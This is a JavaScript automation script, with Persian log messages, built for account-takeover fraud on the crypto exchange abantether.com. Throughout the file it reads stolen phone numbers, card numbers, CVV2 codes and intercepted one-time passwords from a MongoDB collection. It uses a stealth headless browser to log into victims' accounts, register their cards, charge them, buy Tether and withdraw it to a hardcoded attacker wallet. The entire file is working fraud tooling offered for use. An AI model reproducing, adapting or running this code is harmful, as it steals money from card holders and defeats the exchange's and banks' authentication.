require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`)),
  debug: (msg) => console.log(chalk.gray(`[${new Date().toLocaleString('fa-IR')}] 🔍 ${msg}`))
};

let collection;
let lastNoUsersLog = 0;

async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("ZarrinApp").collection("zarinapp");
  log.s("اتصال به دیتابیس ZarrinApp.zarinapp برقرار شد");
}

function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
}

async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3}s)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  await page.evaluate((sel, txt) => {
    const el = document.querySelector(sel);
    if (el) {
      el.value = '';
      el.focus();
    }
  }, selector);
  await page.type(selector, text, { delay: 100 });
}

async function takeScreenshot(page, name) {
  await page.screenshot({ path: `debug-${name}-${Date.now()}.png` });
  log.debug(`اسکرین‌شات ذخیره شد: debug-${name}-${Date.now()}.png`);
}

async function waitAndClick(page, selectors, timeout = 5000) {
  for (const selector of selectors) {
    try {
      await page.waitForSelector(selector, { timeout });
      await page.click(selector);
      log.i(`کلیک شد با سلکتور: ${selector}`);
      return true;
    } catch (e) {
      log.debug(`سلکتور ${selector} پیدا نشد`);
    }
  }
  return false;
}

async function waitAndType(page, selectors, text, timeout = 5000) {
  for (const selector of selectors) {
    try {
      await page.waitForSelector(selector, { timeout });
      await clearAndType(page, selector, text);
      log.i(`تایپ شد در سلکتور: ${selector}`);
      return true;
    } catch (e) {
      log.debug(`سلکتور ${selector} پیدا نشد`);
    }
  }
  return false;
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);
  let browser = null;

  log.start(`شروع پردازش: ${phone} | ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
    await page.setViewport({ width: 390, height: 844 });
    
    // مرحله 1: ورود به سایت
    log.i("در حال بارگذاری صفحه اصلی...");
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
    log.i("صفحه اصلی لود شد");

    // سلکتورهای فیلد تلفن برای نسخه جدید
    const phoneSelectors = [
      'input[data-testid="username-input"]',
      'input[name="username"]',
      'input[placeholder*="شماره موبایل"]',
      'input[inputmode="numeric"]',
      'input[type="tel"]',
      '.phone-input',
      '#mobile'
    ];

    if (!await waitAndType(page, phoneSelectors, phone)) {
      await takeScreenshot(page, 'no-phone-field');
      throw new Error("فیلد تلفن پیدا نشد");
    }

    // دکمه ادامه برای ورود
    const continueButtons = [
      'button[data-testid="login-button"]',
      'button[type="submit"]',
      'button:has-text("ادامه")',
      'button:has-text("ورود")',
      '.submit-btn',
      '.login-btn'
    ];

    if (!await waitAndClick(page, continueButtons)) {
      await takeScreenshot(page, 'no-continue-button');
      throw new Error("دکمه ادامه پیدا نشد");
    }

    // مرحله 2: دریافت و وارد کردن OTP ورود
    log.i("در انتظار دریافت کد OTP برای ورود...");
    const otpLogin = await waitForOtp(doc._id, "otp_login");
    
    // سلکتورهای OTP
    const otpSelectors = [
      'input[data-testid="otp-input"]',
      'input[name="otp"]',
      'input[placeholder*="کد تأیید"]',
      'input[placeholder*="رمز یکبارمصرف"]',
      'input[type="number"]',
      '.otp-input',
      '#otp'
    ];

    if (!await waitAndType(page, otpSelectors, otpLogin, 10000)) {
      await takeScreenshot(page, 'no-otp-field');
      throw new Error("فیلد OTP پیدا نشد");
    }

    // دکمه تأیید OTP
    const verifyButtons = [
      'button[data-testid="verify-button"]',
      'button:has-text("تأیید")',
      'button:has-text("ورود")',
      'button[type="submit"]',
      '.verify-btn'
    ];

    if (!await waitAndClick(page, verifyButtons)) {
      await takeScreenshot(page, 'no-verify-button');
      throw new Error("دکمه تأیید پیدا نشد");
    }

    log.s("ورود با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 3: رفتن به صفحه کارت‌ها
    log.i("در حال رفتن به صفحه کارت‌ها...");
    
    // تلاش برای دسترسی به منو
    const menuSelectors = [
      'button[data-testid="profile-menu"]',
      '.profile-menu',
      'a[href*="/profile"]',
      'button:has-text("پروفایل")'
    ];

    if (await waitAndClick(page, menuSelectors)) {
      await page.waitForTimeout(2000);
    }

    // رفتن به کارت‌ها
    const cardMenuSelectors = [
      'a[href*="/cards"]',
      'a[href*="/card"]',
      'button:has-text("کارت‌ها")',
      'button:has-text("مدیریت کارت")'
    ];

    if (!await waitAndClick(page, cardMenuSelectors)) {
      // تلاش مستقیم
      await page.goto(`${SITE_URL}/cards`, { waitUntil: "networkidle2" });
    }

    // مرحله 4: افزودن کارت جدید
    log.i("در حال افزودن کارت جدید...");
    
    const addCardButtons = [
      'button[data-testid="add-card-button"]',
      'button:has-text("افزودن کارت")',
      'button:has-text("کارت جدید")',
      '.add-card-btn'
    ];

    if (!await waitAndClick(page, addCardButtons)) {
      await takeScreenshot(page, 'no-add-card-button');
      throw new Error("دکمه افزودن کارت پیدا نشد");
    }

    // وارد کردن اطلاعات کارت
    await page.waitForTimeout(2000);

    // شماره کارت
    const cardNumberSelectors = [
      'input[data-testid="card-number-input"]',
      'input[name="cardNumber"]',
      'input[placeholder*="شماره کارت"]',
      '#cardNumber'
    ];

    if (!await waitAndType(page, cardNumberSelectors, card)) {
      await takeScreenshot(page, 'no-card-number-field');
      throw new Error("فیلد شماره کارت پیدا نشد");
    }

    // CVV2
    const cvv2Selectors = [
      'input[data-testid="cvv2-input"]',
      'input[name="cvv2"]',
      'input[placeholder*="CVV2"]',
      'input[placeholder*="کد امنیتی"]',
      '#cvv2'
    ];

    if (!await waitAndType(page, cvv2Selectors, cvv2)) {
      await takeScreenshot(page, 'no-cvv2-field');
      throw new Error("فیلد CVV2 پیدا نشد");
    }

    // تاریخ انقضا - ماه
    const monthSelectors = [
      'select[name="month"]',
      'input[name="month"]',
      '#month',
      '[data-testid="month-select"]'
    ];

    for (const selector of monthSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 3000 });
        if (selector.startsWith('select')) {
          await page.select(selector, month.toString());
        } else {
          await clearAndType(page, selector, month.toString());
        }
        log.i(`ماه وارد شد: ${month}`);
        break;
      } catch (e) {}
    }

    // تاریخ انقضا - سال
    const yearSelectors = [
      'select[name="year"]',
      'input[name="year"]',
      '#year',
      '[data-testid="year-select"]'
    ];

    for (const selector of yearSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 3000 });
        if (selector.startsWith('select')) {
          await page.select(selector, year.toString());
        } else {
          await clearAndType(page, selector, year.toString());
        }
        log.i(`سال وارد شد: ${year}`);
        break;
      } catch (e) {}
    }

    // دکمه ثبت کارت
    const submitCardButtons = [
      'button[data-testid="submit-card-button"]',
      'button:has-text("ثبت کارت")',
      'button:has-text("ذخیره")',
      'button[type="submit"]'
    ];

    if (!await waitAndClick(page, submitCardButtons)) {
      await takeScreenshot(page, 'no-submit-card-button');
      throw new Error("دکمه ثبت کارت پیدا نشد");
    }

    log.s("کارت با موفقیت ثبت شد");
    await page.waitForTimeout(3000);

    // مرحله 5: شارژ حساب
    log.i("شروع فرآیند شارژ حساب...");
    
    // رفتن به صفحه شارژ
    const chargeSelectors = [
      'a[href*="/charge"]',
      'button:has-text("شارژ")',
      'button:has-text("افزایش موجودی")',
      '.charge-btn'
    ];

    if (!await waitAndClick(page, chargeSelectors)) {
      await page.goto(`${SITE_URL}/charge`, { waitUntil: "networkidle2" });
    }

    // وارد کردن مبلغ
    const amountSelectors = [
      'input[data-testid="amount-input"]',
      'input[name="amount"]',
      'input[placeholder*="مبلغ"]',
      '#amount'
    ];

    if (!await waitAndType(page, amountSelectors, AMOUNT_IRT.toString())) {
      await takeScreenshot(page, 'no-amount-field');
      throw new Error("فیلد مبلغ پیدا نشد");
    }

    // دکمه پرداخت
    const paymentButtons = [
      'button[data-testid="payment-button"]',
      'button:has-text("پرداخت")',
      'button:has-text("شارژ")',
      '.payment-btn'
    ];

    if (!await waitAndClick(page, paymentButtons)) {
      await takeScreenshot(page, 'no-payment-button');
      throw new Error("دکمه پرداخت پیدا نشد");
    }

    // مرحله 6: دریافت و وارد کردن OTP بانک
    log.i("در انتظار دریافت کد OTP بانک...");
    const otpBank = await waitForOtp(doc._id, "otp_bank");
    
    await page.waitForTimeout(5000);

    const bankOtpSelectors = [
      'input[data-testid="bank-otp-input"]',
      'input[name="otp"]',
      'input[type="password"]',
      'input[placeholder*="رمز دوم"]',
      '#otp'
    ];

    if (!await waitAndType(page, bankOtpSelectors, otpBank, 10000)) {
      await takeScreenshot(page, 'no-bank-otp-field');
      throw new Error("فیلد OTP بانک پیدا نشد");
    }

    // دکمه تأیید پرداخت
    const confirmPaymentButtons = [
      'button[data-testid="confirm-payment-button"]',
      'button:has-text("تأیید")',
      'button:has-text("پرداخت")',
      'button[type="submit"]'
    ];

    if (!await waitAndClick(page, confirmPaymentButtons)) {
      await takeScreenshot(page, 'no-confirm-payment-button');
      throw new Error("دکمه تأیید پرداخت پیدا نشد");
    }

    log.s("شارژ حساب با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 7: خرید تتر
    log.i("شروع فرآیند خرید تتر...");
    
    // رفتن به صفحه خرید
    const buySelectors = [
      'a[href*="/buy"]',
      'button:has-text("خرید")',
      'button:has-text("خرید تتر")',
      '.buy-btn'
    ];

    if (!await waitAndClick(page, buySelectors)) {
      await page.goto(`${SITE_URL}/buy`, { waitUntil: "networkidle2" });
    }

    // وارد کردن مبلغ خرید
    const buyAmountSelectors = [
      'input[data-testid="buy-amount-input"]',
      'input[name="amount"]',
      'input[placeholder*="مبلغ"]',
      '#buyAmount'
    ];

    const tetherAmount = (AMOUNT_IRT / 100000).toFixed(6); // تبدیل به تتر
    if (!await waitAndType(page, buyAmountSelectors, tetherAmount)) {
      await takeScreenshot(page, 'no-buy-amount-field');
      throw new Error("فیلد مبلغ خرید پیدا نشد");
    }

    // دکمه خرید
    const buyButtons = [
      'button[data-testid="buy-button"]',
      'button:has-text("خرید")',
      'button:has-text("خرید تتر")',
      '.buy-submit-btn'
    ];

    if (!await waitAndClick(page, buyButtons)) {
      await takeScreenshot(page, 'no-buy-button');
      throw new Error("دکمه خرید پیدا نشد");
    }

    log.s("خرید تتر با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    // مرحله 8: برداشت به کیف پول
    log.i("شروع فرآیند برداشت به کیف پول...");
    
    // رفتن به صفحه برداشت
    const withdrawSelectors = [
      'a[href*="/withdraw"]',
      'button:has-text("برداشت")',
      'button:has-text("برداشت تتر")',
      '.withdraw-btn'
    ];

    if (!await waitAndClick(page, withdrawSelectors)) {
      await page.goto(`${SITE_URL}/withdraw`, { waitUntil: "networkidle2" });
    }

    // وارد کردن آدرس کیف پول
    const walletSelectors = [
      'input[data-testid="wallet-address-input"]',
      'input[name="wallet"]',
      'input[placeholder*="آدرس کیف پول"]',
      '#wallet'
    ];

    if (!await waitAndType(page, walletSelectors, WALLET_ADDRESS)) {
      await takeScreenshot(page, 'no-wallet-field');
      throw new Error("فیلد آدرس کیف پول پیدا نشد");
    }

    // وارد کردن مبلغ برداشت
    const withdrawAmountSelectors = [
      'input[data-testid="withdraw-amount-input"]',
      'input[name="amount"]',
      'input[placeholder*="مبلغ"]',
      '#withdrawAmount'
    ];

    if (!await waitAndType(page, withdrawAmountSelectors, tetherAmount)) {
      await takeScreenshot(page, 'no-withdraw-amount-field');
      throw new Error("فیلد مبلغ برداشت پیدا نشد");
    }

    // دکمه برداشت
    const withdrawButtons = [
      'button[data-testid="withdraw-button"]',
      'button:has-text("برداشت")',
      'button:has-text("ثبت درخواست")',
      '.withdraw-submit-btn'
    ];

    if (!await waitAndClick(page, withdrawButtons)) {
      await takeScreenshot(page, 'no-withdraw-button');
      throw new Error("دکمه برداشت پیدا نشد");
    }

    // مرحله 9: تأیید برداشت با OTP
    log.i("در انتظار دریافت کد OTP برای برداشت...");
    const otpWithdraw = await waitForOtp(doc._id, "otp_withdraw");
    
    await page.waitForTimeout(5000);

    const withdrawOtpSelectors = [
      'input[data-testid="withdraw-otp-input"]',
      'input[name="otp"]',
      'input[placeholder*="کد تأیید"]',
      '#withdrawOtp'
    ];

    if (!await waitAndType(page, withdrawOtpSelectors, otpWithdraw, 10000)) {
      await takeScreenshot(page, 'no-withdraw-otp-field');
      throw new Error("فیلد OTP برداشت پیدا نشد");
    }

    // دکمه تأیید نهایی
    const finalConfirmButtons = [
      'button[data-testid="final-confirm-button"]',
      'button:has-text("تأیید")',
      'button:has-text("برداشت")',
      'button[type="submit"]'
    ];

    if (!await waitAndClick(page, finalConfirmButtons)) {
      await takeScreenshot(page, 'no-final-confirm-button');
      throw new Error("دکمه تأیید نهایی پیدا نشد");
    }

    log.s("برداشت با موفقیت انجام شد");
    await page.waitForTimeout(5000);

    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        processed: true, 
        status: "completed", 
        completedAt: new Date(),
        walletAddress: WALLET_ADDRESS,
        amount: AMOUNT_IRT
      } 
    });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        status: "failed", 
        error: err.message,
        failedAt: new Date()
      } 
    });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

// Polling هر ۵ ثانیه
async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(5).toArray();

      if (users.length === 0) {
        if (Date.now() - lastNoUsersLog > 30000) {
          log.i("در انتظار دیوایس جدید...");
          lastNoUsersLog = Date.now();
        }
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          processUser(user);
        }
      }
    } catch (err) {
      log.e("Polling error: " + err.message);
    }
  }, 5000);
}

startPolling();